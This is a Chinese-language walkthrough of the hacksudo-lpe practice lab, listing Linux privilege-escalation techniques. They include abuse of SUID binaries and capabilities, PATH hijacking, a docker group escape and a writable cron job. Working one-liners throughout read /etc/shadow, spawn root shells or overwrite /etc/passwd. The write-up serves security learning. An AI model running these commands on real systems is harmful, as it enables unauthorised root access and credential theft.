# 前言

靶场：`hacksudo-lpe`的后几个`challenge`

基于上篇靶场`hacksudo-ple`的`sudo`提权

# SUID文件提权

## ar文件提权

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\1.jpg)

查看`ar`的SUID用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\2.jpg)

```shell
sudo install -m =xs $(which ar) .

TF=$(mktemp -u)
LFILE="/etc/shadow"
./ar r "$TF" "$LFILE"
cat "$TF"
```

可以看到用法是越权查看文件

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\3.jpg)

## sh提权

这个文件名可能不一样，但是性质是一样的，也就是名称不同。

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\4.jpg)

因为是可执行文件，使用`strings`查看，因为内容太多，这里我是先直接执行，发现另起一个`shell`终端，并且还是当前用户的终端，所以，猜测是执行`sh`

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\5.jpg)

```shell
./bash -p
```

所以直接使用即可

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\6.jpg)



## 切换用户提权

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\7.jpg)

因为知道密码，所以直接替换后，使用上一个进行提取即可

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\8.jpg)



## base32

使用`find`寻找具有SUID权限文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\9.jpg)

测试发现是`base32`，那么就可以直接进行越权读取

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\10.jpg)

## bash提取



使用`find`寻找

```shell
find / -perm -4000 -user root -exec ls -al {} \; 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\11.jpg)

查看文件类型，属于可执行文件，尝试查看帮助，发现是命令`bash`本身

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\12.jpg)

使用`bash -p`即可提取

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\13.jpg)



## cat提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\14.jpg)

查看文件类型，发现是可执行文件，并且查看帮助，确定为`cat`命令

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\15.jpg)

那么直接使用查看，越权查看文件

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\16.jpg)



## chmod提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\17.jpg)

查看文件类型，发现是可执行文件，并且测试帮助，确定为`chmod`命令

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\18.jpg)

那么修改文件为其他人可读可写可执行即可，不过注意，修改时，有时父目录也是有权限限制的，这个别忘了修改

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\19.jpg)





## chroot提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -user root -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\20.jpg)

查看文件类型，为可执行文件，并且查看帮助，确定是命令`chroot`

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\21.jpg)

```shell
./chroot / /bin/sh -p
#即可提取
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\22.jpg)



## cp提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\23.jpg)

查看文件类型为可执行文件，并查看帮助，确定为`cp`命令

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\24.jpg)

与之前使用`sudo`的`cp`进行提取用法差不多

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\25.jpg)

三种方法，复制并读取，复制写入，第三种记录一下，之前并没碰到

```shell
LFILE="/etc/shadow"
./cp --attributes-only --preserve=all ./cp "$LFILE"
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\26.jpg)

## CPUlimit提取

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -4000 -user root -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\27.jpg)

查看文件类型为可执行文件，并且确定命令为`CPUlimit`

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\28.jpg)

查看使用方法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\29.jpg)

```shell
./cpulimit -l 100 -f -- /bin/sh -p
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\30.jpg)

## cut提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\31.jpg)

查看文件类型为可执行文件，并查看帮助，确定为命令`cut`

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\32.jpg)

用法与使用`sudo`提取时一样

```shell
LFILE="/etc/shadow"
./cut -d "" -f1 "$LFILE"
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\33.jpg)

## sh提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\34.jpg)

查看文件类型为可执行文件，并且测试发现是`sh`，直接使用`sh -p`提取即可

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\35.jpg)



## date提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\36.jpg)

查看文件类型为可执行文件，查看帮助确定为命令`date`

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\37.jpg)

用法与具有`sudo`权限是一样的

```shell
date -f "/etc/shadow"
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\38.jpg)

## make提取

使用`find`寻找具有SUID权限文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\39.jpg)

查看文件类型为可执行文件，并且测试，大概率为`make`命令

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\40.jpg)

用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\41.jpg)

```shell
COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\42.jpg)





# 脚本语言Capabilities 提权

## gdb语言

使用`find`命令寻找对于其他用户也是可以执行`gdb`的文件

```shell
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

查看用法，可以看到是查看是否具有`ep`权限的，可以使用`getcap`查看，这里`getcap`环境变量问题，可以先找到其位置，`xargs`就是把前面的输出作为`getcap`的目标

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\44-1.jpg)





![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\43.jpg)

```shell
./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\44.jpg)

## node语言

使用`find`寻找

```shell
find / -name "getcap" 2>/dev/null
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\45.jpg)

查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\46.jpg)

```shell
cp $(which node) .
sudo setcap cap_setuid+ep node

./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

测试，发现无权限使用`setcap`，那就无法修改，无法提取，只能到此

## perl语言

之前确认了`getcap`的命令位置，以及可使用，所以，直接搜索

```shell
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\47.jpg)

查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\48.jpg)

```shell
cp $(which perl) .
sudo setcap cap_setuid+ep perl

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

这里因为在当前用户目录下，有权限，并且满足条件。所以可以到目录下直接使用

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\49.jpg)

## php语言

使用`find`寻找

```shell
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\50.jpg)

查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\51.jpg)

```shell
cp $(which php) .
sudo setcap cap_setuid+ep php

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"
```

进行提取

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\52.jpg)

## python语言

使用`find`寻找

```shell
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\53.jpg)

查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\54.jpg)

```shell
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\55.jpg)



## ruby语言

使用`find`寻找

```shell
find / -type f -executable 2>/dev/null | xargs /bin/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\56.jpg)

查看用法

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\57.jpg)

```shell
cp $(which ruby) .
sudo setcap cap_setuid+ep ruby

./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\58.jpg)



## python3语言

使用`find`寻找

```shell
find / -type f -executable 2>/dev/null | xargs /usr/sbin/getcap -r 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\59.jpg)

查看用法

```shell
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

与`python2`是一样的，都是`python`语言，只是版本不同

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\60.jpg)



# 环境变量提权

## apt-get临时变量

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\61.jpg)

不过测试，发现应该是调用`apt-get`，为什么呢，因为不管传参是什么都不会被接收，说明该文件本身不是`apt`，而是调用的

既然是调用，那么就可以考虑环境变量，利用`export`设置临时变量，并且是具有优先权的，这个最好是在`/tmp`目录下新建`apt-get`，因为这是权限允许范围内的。

然后把文件给予执行权限，执行`shell`时，就会提权成功

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\62.jpg)

## ftp临时变量

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\63.jpg)

测试文件发现，涉及到`ftp`，并且并不是`ftp`命令，参数无法接收，也就是其调用了`ftp`，那么尝试设置临时变量来覆盖，与上面一样，最好是在`/tmp`目录进行

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\65.jpg)

# 可写文件滥用提权

## 利用curl

使用`find`寻找具有SUID权限的文件，不过这里找到的是`curl`

```shell
find - perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\66.jpg)

在上一篇的`sudo`提权文章中，个人以为只能下载，后又研究一下 ，发现不止是`http`协议，也是可以利用`file`协议与`curl`配合，所以就可以进行读取本地文件或写入本地文件

```shell
【curl写入】
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
curl "file://$TF" -o "$LFILE"

【curl读取】
LFILE=/tmp/file_to_read
curl file://$LFILE
```

复制`/etc/passwd`文件，然后修改这个复制id文件，再通过`curl`重新覆盖原本的`/etc/passwd`文件

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\67.jpg)

使用`su`命令切换到自己本身的用户，因为知道自己本身的密码

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\68.jpg)

## 利用具有SUID的py文件

使用`find`寻找具有SUID权限文件

```shell
find /-perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\69.jpg)

可以看到这个`python`文件，具有SUID权限，但是不能直接写入，因为其所属者和所属组都是`root`，且其他人无写入权限，不过这里导入两个包`os`和`sys`，寻找这两个包，看其权限，发现并未有权限

```shell
find / -name "os.py" -exec ls -l {} \; 2>/dev/null
```

寻找导入模块`os.py`位置以及权限，是否可写

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\70.jpg)

但是发现寻找`sys.py`，确没有这个文件，那么能否自己写这个包呢，进行测试，也是无权限写入

这就不知道该怎么提权了，又不能写入



# 可读文件滥用提权

## cpio提权

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -u=s -type f 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\71.jpg)

测试发现，本身就是命令`cpio`，查看用法，发现该命令可进行读、写等操作

链接`https://gtfobins.github.io/gtfobins/cpio/#suid`

```shell
【读文件内容】
LFILE="/root/root.txt"
TF=$(mktemp -d)
echo "$LFILE" | ./cpio -R $UID -dp $TF
cat "$TF/$LFILE"

或者
echo "/root/root.txt" | cpio -o
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\72.jpg)

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\73.jpg)

## git提权

使用`find`寻找具有SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\74.jpg)

查看其用法，可用的操作很多，尤其是具有SUID权限

链接`https://gtfobins.github.io/gtfobins/git/#limited-suid`

```shell
【读取文件内容】
./git diff /dev/null /root/root.txt
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\75.jpg)

测试获取`shell`，发现不行，当前只能读取文件内容

# docker提权

当使用`find`等搜索无发现时，查看`id`发现，当前用户处于`docker`，不过`docker`中并无任何镜像

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\76.jpg)

在进行`docker`逃逸时，常用的镜像就是`alpine`

因为`docker`默认源是在国外，并且大部分的`docker`源可能都失效，所以这里在`kali`中先下载镜像，然后导出，再使用靶机下载

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\77.jpg)

靶机导入

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\78.jpg)

查看用法，大致都是这一种

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\79.jpg)



# 通配符滥用

这里其实就需要构造条件来满足，但是这里并无条件，需要自己使用`root`先创建条件，这里可以看参考链接学习`https://www.freebuf.com/articles/system/176255.html`



# crontab定时提权

使用`find`寻找具有SUID权限用户发现暂无，使用`find`寻找`capabilities`的特权文件，发现暂无。

查看定时任务，一般使用`crontab`可查看文件`/etc/crontab`

发现定时任务，每一分钟执行这个`python`文件

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\80.jpg)

这个文件可以写入，查看文件内容

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\81.jpg)

那么自己写入一个唤起`bash`终端，因为所有者是`root`，所以导致提权成功

当然，这是需要等待一分钟的时间，也就是当定时任务执行的时候

![](D:\stu\vulnhub\hacksudo靶场\pic-ple-2\82.jpg)

# 总结

通过该挑战可以学习到各种方式的提权，并且是不依赖漏洞的。

大部分基于SUID和`sudo`进行提权的

以及一个环境变量和`capabilities`的权限

对于一些文件的修改，而可以间接提权





























